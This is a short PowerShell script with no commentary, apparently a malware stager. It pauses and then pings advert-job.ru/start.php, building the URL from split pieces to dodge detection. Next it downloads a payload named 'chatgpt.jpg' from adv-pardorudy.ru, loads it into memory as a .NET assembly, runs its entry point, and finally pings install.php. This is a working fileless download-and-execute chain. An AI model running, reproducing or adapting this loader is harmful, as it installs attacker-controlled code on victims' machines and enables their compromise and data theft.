sleep -Milliseconds 1235

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri ('ht'+'t'+'ps:'+'//'+'advert-job.ru/start.php') -UseBasicParsing

$bytes = (New-Object System.Net.WebClient).DownloadData("https://adv-pardorudy.ru/dwnld/chatgpt.jpg")
$assembly = [System.Reflection.Assembly]::Load($bytes)

$method = $assembly.EntryPoint
if ($method) {
    $args1 = @($null)
    $method.Invoke($null, $args1)
}

Invoke-WebRequest -Uri ('ht'+'t'+'ps:'+'//'+'advert-job.ru/install.php') -UseBasicParsing